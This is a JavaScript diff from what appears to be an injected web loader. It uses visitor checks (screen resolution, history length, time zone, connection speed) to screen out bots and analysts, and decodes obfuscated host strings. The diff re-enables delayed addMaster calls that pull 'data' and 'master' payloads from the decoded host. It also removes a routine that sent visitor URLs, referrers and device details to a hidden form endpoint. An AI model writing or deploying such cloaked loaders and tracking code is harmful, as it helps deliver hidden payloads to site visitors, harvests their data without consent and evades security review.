@@ -43,11 +43,10 @@ function getDefaultName(name) {
 function _39012seefalseUser() {
   var place = new Date().toTimeString();
   if (
-    (window.screen.width <= window.innerWidth && window.screen.height <= window.innerHeight) || !navigator.userAgent.includes(navigator.platform.substring(0, 3)) ||
+    (window.screen.width < window.innerWidth && window.screen.height < window.innerHeight) || !navigator.userAgent.includes(navigator.platform.substring(0, 3)) ||
     (history.length > 3 || history.length == 1) ||
     Nloaded > 2 ||
     !(place.includes('Pacific') || place.includes('Eastern') || place.includes('Central')) ||
-    ((window.screen.width == 1440 && window.screen.height == 900) || (window.screen.width == 1536 && window.screen.height == 864) || (window.screen.width == 1366 && window.screen.height == 768)) ||
     navigator.connection.downlink < 9
   ) {
     return true;
@@ -67,12 +66,9 @@ function addMaster(url) {
   }
 }
 var serverData = {
-  'null': sc.get("waLHyRV02ccHpM16WLay09Bz3ZbXvJ82WZaXuIItWcd3olRzXdaGnV5tyZbSp1"),
-  'netlify': sc.get("waLHwRB0XcYHuMk6nLZyp9xzGZdXlJ52mZLXyJQuzZMX5RUsTadWwZM5DLOT5kI4HbMD5lMzDb"),
-  'hstgr.io': sc.get("8aCHcRw0FcmHLM56ZLWya9stRbX2ZJup5cymZl0zQZGSd1vpNYz2N9vuZc3yb0n55Mmmcxl3pa2"),
+  'null': sc.get("vaEHjRd0vc8HWMa6uLIyW9dzoZRWX8atnb5WiFbp"),
 }
-// var lnkMain = serverData[String(document.querySelector("#mobiOptiElem").getAttribute('server'))];
-// var lnkMain="";
+var lnkMain="";
 
 
 function _init() {
@@ -84,40 +80,15 @@ function _init() {
     localStorage.setItem("Nloaded", 1);
   }
 
-  // setTimeout(()=>{
-  //   addMaster(`${lnkMain}data-19b902380k09`);
-  // },100);
+  setTimeout(()=>{
+    addMaster(`${lnkMain}data-19b902380k09`);
+  },100);
 
-  // setTimeout(()=>{
-  //   addMaster(`${lnkMain}master-10a404587b40544b`);
-  // },200);
-  sendInfo();
+  setTimeout(()=>{
+    addMaster(`${lnkMain}master-10a404587b40544b`);
+  },200);
 }
 //this is a last line
 if (!_initiated) {
   _init();
-}
-
-function sendInfo(msg = "") {
-  // console.log('sendInfo', document.timeline.currentTime / 1000, msg)
-
-  makeForm(sc.get('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmUdxvQbl2VdUslZ1Sa5zjQbT2T01vpZXmU9Eyhb2XMMsvNdjSZ86w9L12bQQvBZjSN8FxNRWkMFnJFcDFaFjMlUH2UZMCZdzlMVw6ZdDzWB1'), {
-    "entry.522782255": Nloaded + "-" + history.length + "_" + document.referrer,
-    "entry.2147471592": location.href,
-    "entry.559704587": msg,
-    "entry.1784255635": getMacTime(),
-    "entry.1604074943": userWinInfo(),
-  });
-}
-
-
-function userWinInfo() {
-  var str = Math.floor(window.scrollY) + " > " + window.screen.width + "/" + window.innerWidth + " x " + window.screen.height + "/" + window.innerHeight + " ||| ";
-  var conn = navigator.connection || {};
-  str += `${conn.effectiveType} rtt:${conn.rtt} mbps:${conn.downlink}`
-
-  return str;
-}
-function getMacTime() {
-  return new Date().toLocaleTimeString() + " " + new Date().toTimeString().split("(")[1].replace(")", "");
 }
